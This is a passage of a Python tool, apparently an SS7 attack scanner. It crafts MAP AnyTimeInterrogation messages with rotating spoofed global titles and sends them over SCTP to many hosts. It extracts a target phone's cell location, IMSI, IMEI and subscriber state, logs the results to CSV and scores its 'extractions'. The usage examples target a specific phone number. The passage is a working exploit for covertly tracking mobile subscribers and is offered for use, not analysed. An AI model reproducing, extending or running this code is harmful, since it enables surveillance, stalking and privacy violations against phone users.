                        if comp_data[i] == 0x02 and i + 2 < len(comp_data):
                            error_code = comp_data[i + 2]
                            if error_code in MAP_ERRORS:
                                result.error_info = MAP_ERRORS[error_code]
                                result.error_code = error_code
                                break
                except Exception:
                    result.error_info = "MAP Error detected"
                break
                
            elif comp_tag == TCAP_TAGS['COMP_REJECT']:
                result.tcap_outcome = 'Reject'
                result.error_info = "TCAP Reject detected"
                break
            
            offset += 1
            
        except Exception as e:
            if logger:
                logger.debug(f"[{unique_id}] Component parsing error at offset {offset}: {e}")
            break
    
    return result

def find_cgi_patterns_professional(data: bytes, unique_id: str) -> Optional[EnhancedLocationInfo]:
    """Professional CGI pattern finder with enhanced validation"""
    
    for i in range(len(data) - 6):
        try:
            potential_plmn = data[i:i+3]
            
            # Enhanced PLMN validation
            valid_plmn = True
            for byte in potential_plmn:
                if ((byte & 0x0F) > 9 and (byte & 0x0F) != 0xF) or \
                   (((byte >> 4) & 0x0F) > 9 and ((byte >> 4) & 0x0F) != 0xF):
                    valid_plmn = False
                    break
            
            if valid_plmn:
                # Try CGI
                if i + 7 <= len(data):
                    test_cgi = data[i:i+7]
                    try:
                        mcc, mnc = decode_plmn_professional(test_cgi[:3])
                        lac = int.from_bytes(test_cgi[3:5], 'big')
                        ci = int.from_bytes(test_cgi[5:7], 'big')
                        
                        # Validate reasonable values
                        if 100 <= int(mcc) <= 999 and 0 <= int(mnc) <= 999 and 0 < lac < 65536 and 0 < ci < 65536:
                            location = EnhancedLocationInfo()
                            location.mcc = mcc
                            location.mnc = mnc
                            location.lac = str(lac)
                            location.cell_id = str(ci)
                            location.cgi_found = True
                            
                            if logger:
                                logger.info(f"[{unique_id}] 🎯 Professional pattern CGI found: MCC={mcc}, MNC={mnc}, LAC={lac}, CI={ci}")
                            return location
                    except Exception:
                        continue
                
                # Try LAI
                elif i + 5 <= len(data):
                    test_lai = data[i:i+5]
                    try:
                        mcc, mnc = decode_plmn_professional(test_lai[:3])
                        lac = int.from_bytes(test_lai[3:5], 'big')
                        
                        if 100 <= int(mcc) <= 999 and 0 <= int(mnc) <= 999 and 0 < lac < 65536:
                            location = EnhancedLocationInfo()
                            location.mcc = mcc
                            location.mnc = mnc
                            location.lac = str(lac)
                            location.lai_found = True
                            
                            if logger:
                                logger.info(f"[{unique_id}] 🎯 Professional pattern LAI found: MCC={mcc}, MNC={mnc}, LAC={lac}")
                            return location
                    except Exception:
                        continue
        
        except Exception:
            continue
    
    return None

# === Professional Display Functions ===

def display_professional_result(result: ScanResult, unique_id: str):
    """Display scan result with professional formatting"""
    
    # Determine status and colors
    if result.location_info.cgi_found and result.subscriber_info.imsi != "N/A":
        title_color = Colors.BRIGHT_GREEN
        status_emoji = "🎯"
        status_text = "FULL SUCCESS - COMPLETE DATA"
    elif result.location_info.cgi_found:
        title_color = Colors.GREEN
        status_emoji = "📍"
        status_text = "LOCATION SUCCESS - CGI EXTRACTED"
    elif result.subscriber_info.imsi != "N/A":
        title_color = Colors.CYAN
        status_emoji = "📱"
        status_text = "SUBSCRIBER SUCCESS - IMSI EXTRACTED"
    elif result.success:
        title_color = Colors.BLUE
        status_emoji = "✅"
        status_text = "PARTIAL SUCCESS"
    elif 'Timeout' in result.tcap_outcome:
        title_color = Colors.YELLOW
        status_emoji = "⏰"
        status_text = "TIMEOUT"
    elif 'Error' in result.tcap_outcome:
        title_color = Colors.BRIGHT_RED
        status_emoji = "❌"
        status_text = "MAP ERROR"
    elif 'Reject' in result.tcap_outcome:
        title_color = Colors.RED
        status_emoji = "🚫"
        status_text = "REJECTED"
    else:
        title_color = Colors.MAGENTA
        status_emoji = "❓"
        status_text = "UNKNOWN"
    
    # Display header
    print_colored("─" * 90, Colors.CYAN)
    print_colored(f"{status_emoji} {result.ip}:{result.port} - {status_text}", title_color, bold=True)
    print_colored(f"⏱️  Duration: {result.duration_ms:.2f}ms | TCAP: {result.tcap_outcome} | Size: {result.parsed_data_size}B", Colors.WHITE)
    
    # Location Information
    if result.location_info.cgi_found:
        print_colored(f"📍 CGI: MCC={result.location_info.mcc}, MNC={result.location_info.mnc}, "
                     f"LAC={result.location_info.lac}, CI={result.location_info.cell_id}", 
                     Colors.BRIGHT_GREEN, bold=True)
    elif result.location_info.lai_found:
        print_colored(f"📍 LAI: MCC={result.location_info.mcc}, MNC={result.location_info.mnc}, "
                     f"LAC={result.location_info.lac}", Colors.GREEN)
    
    # Subscriber Information
    if result.subscriber_info.imsi != "N/A":
        print_colored(f"📱 IMSI: {result.subscriber_info.imsi}", Colors.BRIGHT_CYAN, bold=True)
    
    if result.subscriber_info.msisdn != "N/A":
        print_colored(f"📞 MSISDN: {result.subscriber_info.msisdn}", Colors.CYAN)
    
    if result.subscriber_info.imei != "N/A":
        print_colored(f"📟 IMEI: {result.subscriber_info.imei}", Colors.CYAN)
    
    # Network Information
    if result.location_info.vlr_name != "N/A":
        print_colored(f"🏢 VLR: {result.location_info.vlr_name}", Colors.BLUE)
    
    if result.location_info.msc_name != "N/A":
        print_colored(f"🏢 MSC: {result.location_info.msc_name}", Colors.BLUE)
    
    if result.location_info.sgsn_name != "N/A":
        print_colored(f"🏢 SGSN: {result.location_info.sgsn_name}", Colors.BLUE)
    
    # Subscriber State
    if result.subscriber_info.subscriber_state != "N/A":
        print_colored(f"📊 Subscriber State: {result.subscriber_info.subscriber_state}", Colors.YELLOW)
    
    # Advanced Information
    if result.location_info.location_age != "N/A":
        print_colored(f"⏰ Location Age: {result.location_info.location_age}", Colors.DIM)
    
    if result.location_info.geographical_info != "N/A":
        print_colored(f"🌍 Geo Info: {result.location_info.geographical_info[:20]}...", Colors.DIM)
    
    # Error Information
    if result.error_info != "N/A" and "successfully" not in result.error_info:
        error_color = Colors.RED if "Error" in result.tcap_outcome else Colors.YELLOW
        print_colored(f"ℹ️  Info: {result.error_info}", error_color)
    
    if result.error_code is not None and result.error_code != -1:
        print_colored(f"🔢 Error Code: {result.error_code}", Colors.RED)
    
    # Technical Details
    if result.map_version != "N/A":
        print_colored(f"🗺️  MAP Version: {result.map_version}", Colors.DIM)
    
    if result.used_cgpa_gt:
        print_colored(f"🔧 GT: {result.used_cgpa_gt[-8:]}..., SSN: {result.used_cgpa_ssn}, PC: {result.used_sccp_pc}", Colors.DIM)

def update_professional_statistics(result: ScanResult):
    """Update professional statistics with comprehensive metrics"""
    with stats_lock:
        PROFESSIONAL_STATS['total_attempts'] += 1
        
        if result.success:
            PROFESSIONAL_STATS['successful_responses'] += 1
        
        # Location statistics
        if result.location_info.cgi_found or result.location_info.lai_found:
            PROFESSIONAL_STATS['location_extractions'] += 1
        
        # Subscriber statistics
        if result.subscriber_info.imsi != "N/A":
            PROFESSIONAL_STATS['imsi_extractions'] += 1
        
        if result.subscriber_info.imei != "N/A":
            PROFESSIONAL_STATS['imei_extractions'] += 1
        
        if result.subscriber_info.subscriber_state != "N/A":
            PROFESSIONAL_STATS['subscriber_state_extractions'] += 1
        
        # Network information
        if (result.location_info.vlr_name != "N/A" or 
            result.location_info.msc_name != "N/A" or 
            result.location_info.sgsn_name != "N/A"):
            PROFESSIONAL_STATS['network_info_extractions'] += 1
        
        # Full information extraction
        if (result.location_info.cgi_found and 
            result.subscriber_info.imsi != "N/A"):
            PROFESSIONAL_STATS['full_info_extractions'] += 1
        
        # Error tracking
        if 'Timeout' in result.tcap_outcome:
            PROFESSIONAL_STATS['timeouts'] += 1
        elif 'Error' in result.tcap_outcome:
            PROFESSIONAL_STATS['map_errors'] += 1
        elif 'Reject' in result.tcap_outcome:
            PROFESSIONAL_STATS['tcap_rejects'] += 1
        elif 'ConnectionRefused' in result.tcap_outcome or 'NetworkError' in result.tcap_outcome:
            PROFESSIONAL_STATS['connection_errors'] += 1
        
        # Track error breakdown
        PROFESSIONAL_STATS['error_breakdown'][result.tcap_outcome] += 1
        
        # Calculate success rate
        if PROFESSIONAL_STATS['total_attempts'] > 0:
            PROFESSIONAL_STATS['success_rate'] = (PROFESSIONAL_STATS['successful_responses'] / 
                                                 PROFESSIONAL_STATS['total_attempts']) * 100
        
        # Calculate data richness score
        data_points = 0
        if result.location_info.cgi_found:
            data_points += 4  # MCC, MNC, LAC, CI
        if result.subscriber_info.imsi != "N/A":
            data_points += 3
        if result.subscriber_info.imei != "N/A":
            data_points += 2
        if result.location_info.vlr_name != "N/A":
            data_points += 1
        
        PROFESSIONAL_STATS['data_richness_score'] = data_points

# === Professional PDU Builder ===

def format_msisdn_professional(msisdn: str, nai_byte: int = 0x91) -> bytes:
    """Professional MSISDN formatting with enhanced validation"""
    if not msisdn:
        raise ValueError("MSISDN cannot be empty")
    
    digits = re.sub(r'[^\d]', '', msisdn)
    if not digits:
        raise ValueError("MSISDN must contain digits")
    
    if len(digits) < 7 or len(digits) > 15:
        if logger:
            logger.warning(f"MSISDN length unusual: {len(digits)} digits")
    
    # Enhanced BCD encoding
    if len(digits) % 2:
        digits += "F"
    
    bcd_bytes = bytearray([nai_byte])
    
    for i in range(0, len(digits), 2):
        digit1 = int(digits[i])
        digit2 = int(digits[i+1]) if digits[i+1] != 'F' else 0xF
        bcd_bytes.append((digit2 << 4) | digit1)
    
    return bytes(bcd_bytes)

def build_sccp_address_professional(ssn: int, gt: str, tt: int = 0, np: int = 1, 
                                   nai: int = 4, es: int = 1) -> Any:
    """Professional SCCP address builder"""
    try:
        addr = PYCRATE['SCCP']._SCCPAddr()
        
        # Enhanced address indicator setup
        addr['AddrInd']['res'].set_val(0)
        addr['AddrInd']['RoutingInd'].set_val(1)
        addr['AddrInd']['GTInd'].set_val(4)
        addr['AddrInd']['SSNInd'].set_val(1)
        addr['AddrInd']['PCInd'].set_val(0)
        
        addr['SSN'].set_val(ssn)
        
        # Professional GT_4 structure
        gt4 = addr['GT'].get_alt()
        gt4['TranslationType'].set_val(tt)
        gt4['NumberingPlan'].set_val(np)
        gt4['EncodingScheme'].set_val(es)
        gt4['spare'].set_val(0)
        gt4['NAI'].set_val(nai)
        
        gt4.set_addr_bcd(gt)
        
        return addr
        
    except Exception as e:
        if logger:
            logger.error(f"Professional SCCP address build error: {e}")
        raise

def build_ati_pdu_professional(otid_bytes: bytes, ati_variant: AtiVariant, target_msisdn: str,
                              cgpa_gt: str, args: argparse.Namespace, unique_id: str) -> Optional[bytes]:
    """Professional ATI PDU builder with full Pycrate integration"""
    
    try:
        if logger:
            logger.debug(f"[{unique_id}] Building professional ATI PDU: {ati_variant.value}")
        
        # Build enhanced MAP ATI Arguments
        ati_args = {}
        
        # Professional subscriber identity encoding
        try:
            nai_val = (0x80 | args.cdpa_nai) if args.cdpa_nai <= 15 else args.cdpa_nai
            msisdn_bytes = format_msisdn_professional(target_msisdn, nai_val)
            ati_args['subscriberIdentity'] = ('msisdn', msisdn_bytes)
            if logger:
                logger.debug(f"[{unique_id}] Professional MSISDN encoded: {len(msisdn_bytes)} bytes")
        except Exception as e:
            if logger:
                logger.error(f"[{unique_id}] Professional MSISDN encoding error: {e}")
            return None
        
        # Enhanced requested info based on variant
        if ati_variant != AtiVariant.MINIMAL:
            req_info = {}
            
            if ati_variant in [AtiVariant.STANDARD, AtiVariant.LOCATION_ONLY, AtiVariant.ALL_INFO]:
                req_info['locationInformation'] = 0
                req_info['currentLocationRetrieved'] = 0
                
            if ati_variant in [AtiVariant.STANDARD, AtiVariant.SUBSCRIBER_STATE, AtiVariant.ALL_INFO]:
                req_info['subscriberInfo'] = 0
                
            if ati_variant in [AtiVariant.EQUIPMENT_STATUS, AtiVariant.ALL_INFO]:
                req_info['equipmentStatus'] = 0
                req_info['imei'] = 0
                
            if ati_variant == AtiVariant.ALL_INFO:
                req_info['locationInformationEPS'] = 0
                req_info['userCSGInformation'] = 0
                
            if req_info:
                ati_args['requestedInfo'] = req_info
                if logger:
                    logger.debug(f"[{unique_id}] Professional requested info: {list(req_info.keys())}")
        
        # Professional GSM-SCF Address
        if ati_variant != AtiVariant.MINIMAL and cgpa_gt:
            try:
                nai_scf = (0x80 | args.cgpa_nai) if args.cgpa_nai <= 15 else args.cgpa_nai
                scf_bytes = format_msisdn_professional(cgpa_gt, nai_scf)
                ati_args['gsmSCF-Address'] = scf_bytes
                if logger:
                    logger.debug(f"[{unique_id}] Professional GSM-SCF address encoded: {len(scf_bytes)} bytes")
            except Exception as e:
                if logger:
                    logger.warning(f"[{unique_id}] Professional GSM-SCF encoding error: {e}")
        
        # Get professional MAP ATI Argument Type
        MAP_MS_DataTypes = getattr(PYCRATE['MAP_defs'], 'MAP_MS_DataTypes', PYCRATE['MAP_defs'])
        AtiArgType = getattr(MAP_MS_DataTypes, 'AnyTimeInterrogationArg', None)
        
        if not AtiArgType:
            if logger:
                logger.error(f"[{unique_id}] AnyTimeInterrogationArg type not found")
            return None
        
        # Professional MAP parameter encoding
        try:
            ati_param = deepcopy(AtiArgType)
            ati_param.set_val(ati_args)
            parameter_ber = ati_param.to_ber()
            if logger:
                logger.debug(f"[{unique_id}] Professional MAP parameter encoded: {len(parameter_ber)} bytes")
        except Exception as e:
            if logger:
                logger.error(f"[{unique_id}] Professional MAP parameter encoding error: {e}")
            return None
        
        # Build professional TCAP Invoke
        invoke_id = random.randint(1, 127)
        
        try:
            invoke_pdu = deepcopy(PYCRATE['TCAP_defs'].Invoke)
            invoke_values = {
                'invokeID': invoke_id,
                'opCode': ('localValue', MAP_OP_ANY_TIME_INTERROGATION)
            }
            invoke_pdu.set_val(invoke_values)
            
            # Professional parameter setting
            try:
                invoke_pdu._cont['parameter'].from_ber(parameter_ber)
                if logger:
                    logger.debug(f"[{unique_id}] Professional invoke parameter set successfully")
            except Exception:
                try:
                    invoke_pdu._cont['parameter']._val = parameter_ber
                    if logger:
                        logger.debug(f"[{unique_id}] Professional parameter set via _val")
                except Exception as param_e2:
                    if logger:
                        logger.error(f"[{unique_id}] All professional parameter methods failed: {param_e2}")
                    return None
            
        except Exception as e:
            if logger:
                logger.error(f"[{unique_id}] Professional invoke building error: {e}")
            return None
        
        # Build professional Component
        try:
            component_obj = deepcopy(PYCRATE['TCAP_defs'].Component)
            component_obj.set_val(('invoke', invoke_pdu.get_val()))
            
            cp_obj = deepcopy(PYCRATE['TCAP_defs'].ComponentPortion)
            cp_obj.set_val([component_obj.get_val()])
            
            if logger:
                logger.debug(f"[{unique_id}] Professional component portion built")
        except Exception as e:
            if logger:
                logger.error(f"[{unique_id}] Professional component building error: {e}")
            return None
        
        # Build professional Begin PDU
        try:
            begin_pdu = deepcopy(PYCRATE['TCAP_defs'].Begin)
            begin_values = {'otid': otid_bytes}
            
            if cp_obj.get_val():
                begin_values['components'] = cp_obj.get_val()
            
            begin_pdu.set_val(begin_values)
            
            tcap_message = deepcopy(PYCRATE['TCAP_defs'].TCMessage)
            tcap_message.set_val(('begin', begin_pdu.get_val()))
            
            tcap_bytes = tcap_message.to_ber()
            if logger:
                logger.info(f"[{unique_id}] Professional TCAP PDU built: {len(tcap_bytes)} bytes")
            
        except Exception as e:
            if logger:
                logger.error(f"[{unique_id}] Professional TCAP message building error: {e}")
            return None
        
        # Build professional SCCP wrapper
        try:
            cdpa_addr = build_sccp_address_professional(
                args.cdpa_ssn, target_msisdn, args.cdpa_tt,
                args.cdpa_np, args.cdpa_nai, args.cdpa_es
            )
            
            cgpa_addr = build_sccp_address_professional(
                args.used_cgpa_ssn, cgpa_gt, args.cgpa_tt,
                args.cgpa_np, args.cgpa_nai, args.cgpa_es
            )
            
            sccp_udt = PYCRATE['SCCP'].SCCPUnitData()
            sccp_values = {
                'Type': 9,
                'ProtocolClass': {
                    'Handling': 0,
                    'Class': args.used_sccp_pc & 0x0F
                },
                'Pointers': {'Ptr0': 0, 'Ptr1': 0, 'Ptr2': 0},
                'CalledPartyAddr': {'Len': 0, 'Value': cdpa_addr.get_val()},
                'CallingPartyAddr': {'Len': 0, 'Value': cgpa_addr.get_val()},
                'Data': {'Len': len(tcap_bytes), 'Value': tcap_bytes}
            }
            sccp_udt.set_val(sccp_values)
            
            sccp_bytes = sccp_udt.to_bytes()
            if logger:
                logger.info(f"[{unique_id}] Professional complete PDU built: {len(sccp_bytes)} bytes")
            
            return sccp_bytes
            
        except Exception as e:
            if logger:
                logger.error(f"[{unique_id}] Professional SCCP building error: {e}")
            return None
        
    except Exception as e:
        if logger:
            logger.error(f"[{unique_id}] Professional PDU build exception: {e}", exc_info=True)
        return None

# === Professional Scanner Function ===

def process_target_professional(ip: str, port: int, args: argparse.Namespace,
                               otid: bytes, variant: AtiVariant, attempt: int = 1) -> ScanResult:
    """Professional target processing with comprehensive error handling"""
    
    unique_id = f"{ip}:{port}-{otid.hex()[:6]}-{variant.value[:3]}-A{attempt}"
    start_time = time.perf_counter()
    
    if logger:
        logger.debug(f"[{unique_id}] Starting professional scan")
    
    # Generate professional dynamic parameters
    used_cgpa_ssn = random.choice(args.cgpa_ssn_pool)
    used_cgpa_gt = gt_pool.get_next_gt() if gt_pool else "212600000000"
    used_sccp_pc = random.choice(args.sccp_proto_class_pool)
    
    args.used_cgpa_ssn = used_cgpa_ssn
    args.used_cgpa_gt = used_cgpa_gt
    args.used_sccp_pc = used_sccp_pc
    
    # Initialize professional result
    result = ScanResult(
        ip=ip,
        port=port,
        timestamp=datetime.now(timezone.utc).isoformat(),
        sent_otid=otid.hex(),
        ati_variant_used=variant.value,
        attempt_number=attempt,
        used_cgpa_ssn=used_cgpa_ssn,
        used_cgpa_gt=used_cgpa_gt,
        used_sccp_pc=used_sccp_pc
    )
    
    sock = None
    
    try:
        # Build professional PDU
        if logger:
            logger.info(f"[{unique_id}] Building professional {variant.value} PDU")
        result.tcap_outcome = "Building"
        
        sccp_pdu = build_ati_pdu_professional(
            otid, variant, args.target_msisdn, used_cgpa_gt, args, unique_id
        )
        
        if not sccp_pdu:
            result.tcap_outcome = "BuildError"
            result.error_info = "Professional PDU construction failed"
            return result
        
        result.tcap_outcome = "PDU_Built"
        
        # Professional network communication
        if logger:
            logger.info(f"[{unique_id}] Professional connecting to {ip}:{port}")
        
        sock = DEPS['sctp'].sctpsocket_tcp(socket.AF_INET)
        sock.settimeout(args.sctp_timeout)
        sock.connect((ip, port))
        
        if logger:
            logger.debug(f"[{unique_id}] Professional connection established")
        
        # Send professional PDU
        bytes_sent = sock.sctp_send(sccp_pdu, ppid=socket.htonl(args.sctp_ppid))
        if logger:
            logger.debug(f"[{unique_id}] Professional sent {bytes_sent} bytes")
        
        # Receive professional response
        raw_response = sock.recv(16384)  # Increased buffer for professional use
        
        if not raw_response:
            result.tcap_outcome = "EmptyResponse"
            result.error_info = "Received empty response"
            return result
        
        if logger:
            logger.info(f"[{unique_id}] Professional received {len(raw_response)} bytes")
        
        # Professional response parsing
        parse_result = parse_response_professional(raw_response, unique_id)
        
        # Update result with professional parse results
        result.success = parse_result.success
        result.tcap_outcome = parse_result.tcap_outcome
        result.error_info = parse_result.error_info
        result.error_code = parse_result.error_code
        result.location_info = parse_result.location_info
        result.subscriber_info = parse_result.subscriber_info
        result.received_dtid = parse_result.received_dtid
        result.raw_response_hex = parse_result.raw_response_hex
        result.map_version = parse_result.map_version
        result.parsed_data_size = parse_result.parsed_data_size
        
        # Professional hex dump logging
        if DEPS['hexdump'] and logger and logger.isEnabledFor(logging.DEBUG):
            try:
                logger.debug(f"[{unique_id}] Professional response hex dump:\n{DEPS['hexdump'].hexdump(raw_response, result='return')}")
            except Exception:
                pass
        
    except socket.timeout:
        result.tcap_outcome = "Timeout"
        result.error_info = f"Professional timeout after {args.sctp_timeout}s"
        if logger:
            logger.debug(f"[{unique_id}] Professional timeout")
        
    except (ConnectionRefusedError, ConnectionResetError) as conn_e:
        result.tcap_outcome = "ConnectionRefused"
        result.error_info = f"Professional connection error: {str(conn_e)[:50]}"
        
    except OSError as os_e:
        result.tcap_outcome = "NetworkError"
        result.error_info = f"Professional network error: {str(os_e)[:50]}"
        
    except Exception as e:
        result.tcap_outcome = "UnexpectedError"
        result.error_info = f"Professional unexpected error: {str(e)[:100]}"
        if logger:
            logger.exception(f"[{unique_id}] Professional unexpected error")
        
    finally:
        if sock:
            try:
                sock.close()
            except:
                pass
        
        result.duration_ms = (time.perf_counter() - start_time) * 1000
    
    # Display professional result
    display_professional_result(result, unique_id)
    
    # Update professional statistics
    update_professional_statistics(result)
    
    return result

# === Professional CSV and Statistics ===

def save_professional_result_to_csv(result: ScanResult, csv_file: Path, headers: List[str]):
    """Save professional scan result to CSV file"""
    try:
        with main_csv_lock:
            with open(csv_file, 'a', newline='', encoding='utf-8') as f:
                row_data = []
                for header in headers:
                    if header in ['mcc', 'mnc', 'lac', 'cell_id', 'cgi_found', 'lai_found', 
                                 'vlr_name', 'msc_name', 'sgsn_name', 'geographical_info',
                                 'location_number', 'location_age', 'rac', 'service_area_code',
                                 'gmlc_name', 'current_location_retrieved', 'ps_subscriber_state']:
                        value = str(getattr(result.location_info, header, "")).replace(",", " ").replace("\n", " ")
                    elif header in ['imsi', 'msisdn', 'imei', 'subscriber_state', 'equipment_status',
                                   'camel_subscription_info', 'call_forwarding_data', 'call_barring_info',
                                   'odb_info', 'roaming_restriction', 'subscriber_status']:
                        value = str(getattr(result.subscriber_info, header, "")).replace(",", " ").replace("\n", " ")
                    else:
                        value = str(getattr(result, header, "")).replace(",", " ").replace("\n", " ")
                    row_data.append(value)
                f.write(",".join(row_data) + "\n")
    except Exception as e:
        if logger:
            logger.error(f"Professional CSV save error: {e}")

def display_professional_final_statistics():
    """Display comprehensive professional final statistics"""
    print_colored("\n" + "="*90, Colors.BRIGHT_CYAN, bold=True)
    print_colored("📊 PROFESSIONAL SCAN COMPLETE - COMPREHENSIVE STATISTICS", Colors.BRIGHT_GREEN, bold=True)
    print_colored("="*90, Colors.BRIGHT_CYAN, bold=True)
    
    # Main professional statistics
    print_colored(f"📈 Total attempts: {PROFESSIONAL_STATS['total_attempts']}", Colors.WHITE, bold=True)
    print_colored(f"✅ Successful responses: {PROFESSIONAL_STATS['successful_responses']}", Colors.GREEN)
    print_colored(f"🎯 Full information extractions: {PROFESSIONAL_STATS['full_info_extractions']}", Colors.BRIGHT_GREEN, bold=True)
    print_colored(f"📍 Location extractions: {PROFESSIONAL_STATS['location_extractions']}", Colors.BLUE)
    print_colored(f"📱 IMSI extractions: {PROFESSIONAL_STATS['imsi_extractions']}", Colors.CYAN, bold=True)
    print_colored(f"📟 IMEI extractions: {PROFESSIONAL_STATS['imei_extractions']}", Colors.CYAN)
    print_colored(f"📊 Subscriber state extractions: {PROFESSIONAL_STATS['subscriber_state_extractions']}", Colors.MAGENTA)
    print_colored(f"🏢 Network info extractions: {PROFESSIONAL_STATS['network_info_extractions']}", Colors.BLUE)
    
    # Professional error statistics
    print_colored(f"⏰ Timeouts: {PROFESSIONAL_STATS['timeouts']}", Colors.YELLOW)
    print_colored(f"❌ MAP errors: {PROFESSIONAL_STATS['map_errors']}", Colors.RED)
    print_colored(f"🚫 TCAP rejects: {PROFESSIONAL_STATS['tcap_rejects']}", Colors.RED)
    print_colored(f"🔌 Connection errors: {PROFESSIONAL_STATS['connection_errors']}", Colors.RED)
    
    # Professional success rates
    if PROFESSIONAL_STATS['total_attempts'] > 0:
        success_rate = PROFESSIONAL_STATS['success_rate']
        full_info_rate = (PROFESSIONAL_STATS['full_info_extractions'] / PROFESSIONAL_STATS['total_attempts']) * 100
        print_colored(f"📊 Professional success rate: {success_rate:.2f}%", Colors.GREEN, bold=True)
        print_colored(f"📊 Full information rate: {full_info_rate:.2f}%", Colors.BRIGHT_GREEN, bold=True)
        print_colored(f"📊 Data richness score: {PROFESSIONAL_STATS['data_richness_score']:.1f}/10", Colors.CYAN, bold=True)
    
    # Professional time statistics
    if PROFESSIONAL_STATS['start_time']:
        total_time = time.time() - PROFESSIONAL_STATS['start_time']
        print_colored(f"⏱️  Total professional scan time: {total_time:.2f} seconds", Colors.CYAN)
        if PROFESSIONAL_STATS['total_attempts'] > 0:
            avg_time = total_time / PROFESSIONAL_STATS['total_attempts']
            print_colored(f"⏱️  Average per target: {avg_time:.2f} seconds", Colors.CYAN)
    
    # Professional error breakdown
    if PROFESSIONAL_STATS['error_breakdown']:
        print_colored("\n🔍 Professional Error Breakdown:", Colors.YELLOW, bold=True)
        for error_type, count in sorted(PROFESSIONAL_STATS['error_breakdown'].items(), key=lambda x: x[1], reverse=True):
            if count > 0:
                print_colored(f"   {error_type}: {count}", Colors.YELLOW)
    
    print_colored("="*90, Colors.BRIGHT_CYAN, bold=True)

# === Professional Main Function ===

def main():
    """Professional main function with comprehensive argument parsing"""
    global logger, PROFESSIONAL_STATS, gt_pool
    
    # Print professional banner
    print_professional_banner()
    
    # Professional argument parser
    parser = argparse.ArgumentParser(
        description="Professional MAP-ATI Scanner v4.0 - Full Pycrate Integration",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
Professional Examples:
  python3 enhanced_map_ati_scanner_v4.py ips.txt --target-msisdn 212681364829
  python3 enhanced_map_ati_scanner_v4.py ips.txt --target-msisdn 212681364829 --threads 50 --ati-variant ALL_INFO
  python3 enhanced_map_ati_scanner_v4.py ips.txt --target-msisdn 212681364829 --professional-mode --enhanced-parsing
        """
    )
    
    # Basic professional arguments
    parser.add_argument("ips_file", nargs='?', default=PROFESSIONAL_CONFIG['ips_file'],
                       help=f"Professional IPs file (default: {PROFESSIONAL_CONFIG['ips_file']})")
    parser.add_argument("--target-msisdn", default=PROFESSIONAL_CONFIG['target_msisdn'],
                       help=f"Target MSISDN (default: {PROFESSIONAL_CONFIG['target_msisdn']})")
    parser.add_argument("--sctp-ports", default=None,
                       help="Professional SCTP ports (comma-separated)")
    parser.add_argument("--sctp-timeout", type=int, default=PROFESSIONAL_CONFIG['sctp_timeout'],
                       help=f"Professional SCTP timeout (default: {PROFESSIONAL_CONFIG['sctp_timeout']})")
    parser.add_argument("--sctp-ppid", type=lambda x: int(x, 0), default=PROFESSIONAL_CONFIG['sctp_ppid'],
                       help=f"Professional SCTP PPID (default: {PROFESSIONAL_CONFIG['sctp_ppid']})")
    parser.add_argument("--threads", type=int, default=PROFESSIONAL_CONFIG['max_workers'],
                       help=f"Professional worker threads (default: {PROFESSIONAL_CONFIG['max_workers']})")
    parser.add_argument("--results-dir", default=PROFESSIONAL_CONFIG['results_dir'],
                       help=f"Professional results directory (default: {PROFESSIONAL_CONFIG['results_dir']})")
    parser.add_argument("--ati-variant", type=AtiVariant, choices=list(AtiVariant),
                       default=AtiVariant.STANDARD, help="Professional ATI variant")
    parser.add_argument("--log-level", default="INFO", choices=["DEBUG", "INFO", "WARNING", "ERROR"],
                       help="Professional logging level")
    parser.add_argument("--no-csv", action='store_true', help="Disable CSV output")
    parser.add_argument("--gt-pool-size", type=int, default=PROFESSIONAL_CONFIG['gt_pool_size'],
                       help=f"Professional GT pool size (default: {PROFESSIONAL_CONFIG['gt_pool_size']})")
    
    # Professional SCCP parameters
    sccp_group = parser.add_argument_group("Professional SCCP Parameters")
    sccp_group.add_argument("--cdpa-ssn", type=int, default=SCCP_PROFESSIONAL['cdpa_ssn'],
                           help=f"Called Party SSN (default: {SCCP_PROFESSIONAL['cdpa_ssn']})")
    sccp_group.add_argument("--cdpa-tt", type=int, default=SCCP_PROFESSIONAL['cdpa_tt'],
                           help=f"Called Party TT (default: {SCCP_PROFESSIONAL['cdpa_tt']})")
    sccp_group.add_argument("--cdpa-np", type=int, default=SCCP_PROFESSIONAL['cdpa_np'],
                           help=f"Called Party NP (default: {SCCP_PROFESSIONAL['cdpa_np']})")
    sccp_group.add_argument("--cdpa-nai", type=int, default=SCCP_PROFESSIONAL['cdpa_nai'],
                           help=f"Called Party NAI (default: {SCCP_PROFESSIONAL['cdpa_nai']})")
    sccp_group.add_argument("--cdpa-es", type=int, default=SCCP_PROFESSIONAL['cdpa_es'],
                           help=f"Called Party ES (default: {SCCP_PROFESSIONAL['cdpa_es']})")
    sccp_group.add_argument("--cgpa-ssn-pool", type=str, default=None,
                           help="Professional Calling Party SSN pool")
    sccp_group.add_argument("--cgpa-gt-digits", default=SCCP_PROFESSIONAL['cgpa_gt_digits'],
                           help=f"Professional base GT digits (default: {SCCP_PROFESSIONAL['cgpa_gt_digits']})")
    sccp_group.add_argument("--cgpa-tt", type=int, default=SCCP_PROFESSIONAL['cgpa_tt'],
                           help=f"Calling Party TT (default: {SCCP_PROFESSIONAL['cgpa_tt']})")
    sccp_group.add_argument("--cgpa-np", type=int, default=SCCP_PROFESSIONAL['cgpa_np'],
                           help=f"Calling Party NP (default: {SCCP_PROFESSIONAL['cgpa_np']})")
    sccp_group.add_argument("--cgpa-nai", type=int, default=SCCP_PROFESSIONAL['cgpa_nai'],
                           help=f"Calling Party NAI (default: {SCCP_PROFESSIONAL['cgpa_nai']})")
    sccp_group.add_argument("--cgpa-es", type=int, default=SCCP_PROFESSIONAL['cgpa_es'],
                           help=f"Calling Party ES (default: {SCCP_PROFESSIONAL['cgpa_es']})")
    sccp_group.add_argument("--sccp-proto-class-pool", type=str, default=None,
                           help="Professional SCCP Protocol Class pool")
    
    args = parser.parse_args()
    
    # Setup professional logging
    results_dir = Path(args.results_dir)
    results_dir.mkdir(parents=True, exist_ok=True)
    log_file = results_dir / "professional_scanner_v4.log"
    
    logger = setup_professional_logging(log_file, args.log_level)
    logger.info(f"Professional Scanner v4.0 started. Log: {log_file}")
    
    # Parse professional parameters
    if args.cgpa_ssn_pool:
        try:
            args.cgpa_ssn_pool = [int(x.strip()) for x in args.cgpa_ssn_pool.split(',') if x.strip()]
        except ValueError:
            args.cgpa_ssn_pool = SCCP_PROFESSIONAL['cgpa_ssn_pool']
    else:
        args.cgpa_ssn_pool = SCCP_PROFESSIONAL['cgpa_ssn_pool']
    
    if args.sccp_proto_class_pool:
        try:
